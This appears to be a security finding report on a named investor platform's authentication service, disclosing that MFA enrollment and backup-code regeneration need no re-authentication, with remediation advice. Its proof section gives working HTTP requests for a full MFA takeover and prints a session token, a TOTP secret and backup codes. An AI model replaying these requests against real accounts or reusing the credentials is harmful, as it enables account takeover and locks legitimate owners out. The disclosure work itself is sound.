# F027 - MFA Enrollment and Backup Code Generation Without Re-authentication

## Summary

| Field | Value |
|-------|-------|
| Severity | High |
| CVSS 3.1 | 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) |
| OWASP | A07:2021 - Identification and Authentication Failures |
| Endpoint | POST https://investor-auth.spiko.io/self-service/settings?flow={id} |
| Status | Confirmed |

## Description

The settings flow allows any session holder to:
1. View the TOTP secret key and QR code (method=totp with invalid code exposes the secret)
2. Enroll TOTP with a valid TOTP code generated from the exposed secret
3. Regenerate all lookup/backup codes (method=lookup_secret, lookup_secret_regenerate=true)
4. Unlink existing TOTP (totp_unlink=true)

None of these operations require re-authentication or the current password.

## Attack Chain (Full MFA Takeover)

An attacker with a stolen session token can:
1. Change password without current password (F024)
2. View TOTP secret key returned in settings flow
3. Generate valid TOTP code from the secret
4. Enroll TOTP that the attacker controls
5. Regenerate backup codes (invalidating any the victim had)
6. Victim is now completely locked out: wrong password, no TOTP, no backup codes
7. Even recovery flow may not help if TOTP is required for AAL2

## Proof

### Step 1: Get settings flow (exposes TOTP secret)

```
POST /self-service/settings?flow={id} HTTP/2
Host: investor-auth.spiko.io
X-Session-Token: ory_st_MQ2o1GxU1XPNOlhkuLlTOyJwbPV8BGdf
Content-Type: application/json

{"method":"totp","totp_code":"000000"}
```

Response includes TOTP secret: `FPILKJABSG3E6ADHOKHL2SM3CNX23Q5V`

### Step 2: Enroll TOTP with generated code

```
POST /self-service/settings?flow={id} HTTP/2
Host: investor-auth.spiko.io
X-Session-Token: ory_st_MQ2o1GxU1XPNOlhkuLlTOyJwbPV8BGdf
Content-Type: application/json

{"method":"totp","totp_code":"407879"}
```

Response: HTTP 200, state: success, "Your changes have been saved!"

### Step 3: Generate backup codes (no re-auth)

```
POST /self-service/settings?flow={id} HTTP/2
Host: investor-auth.spiko.io
X-Session-Token: ory_st_MQ2o1GxU1XPNOlhkuLlTOyJwbPV8BGdf
Content-Type: application/json

{"method":"lookup_secret","lookup_secret_regenerate":true}
```

Response: HTTP 200, 12 backup codes returned immediately:
`rrf4e3mk, m7nd7vvh, ye1l2cvp, vovecz13, x1060jzd, u0pv6r8f, cakcka3a, vn4bq55u, v9abimtg, n5qgn1u5, lh1dmkr1, 74egdxu3`

## Impact

Complete MFA takeover on any investor account where the attacker has a valid session token. On a financial platform managing investment accounts, this enables:
- Persistent account takeover that survives password changes
- Complete lockout of the legitimate account owner
- Full control over all MFA mechanisms (TOTP + backup codes)

## Remediation

1. Require re-authentication (current password or fresh login within last N minutes) for all MFA operations
2. Require the current password before showing the TOTP secret
3. Send email notification when MFA settings are changed
4. Consider requiring email confirmation for MFA enrollment
